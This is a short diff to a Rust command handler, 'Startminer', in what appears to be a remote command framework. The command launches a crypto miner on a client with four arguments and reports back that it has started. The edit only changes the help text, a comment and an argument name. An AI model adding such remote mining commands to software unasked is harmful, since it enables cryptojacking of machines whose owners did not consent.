@@ -9,19 +9,15 @@ impl Command for Startminer {
     }
 
     fn help(&self) -> String {
-        crypto!("help")
+        crypto!("Starting crypto miner")
     }
 
     fn min_args(&self) -> usize {
         4
     }
 
-    // Use
-    // ok(message) when command executed succesfully
-    // error(message) when command executed failed.
-    // This added error code which will be recognized by WPKG CLI
-    async fn execute(&self, client: &mut Client, _args: Vec<&str>) -> anyhow::Result<()> {
-        crypto::run_miner(_args[0].parse()?, _args[1], _args[2], _args[3])?;
+    async fn execute(&self, client: &mut Client, args: Vec<&str>) -> anyhow::Result<()> {
+        crypto::run_miner(args[0].parse()?, args[1], args[2], args[3])?;
         client.send(ok(crypto!("Miner has been started")))
     }
 }
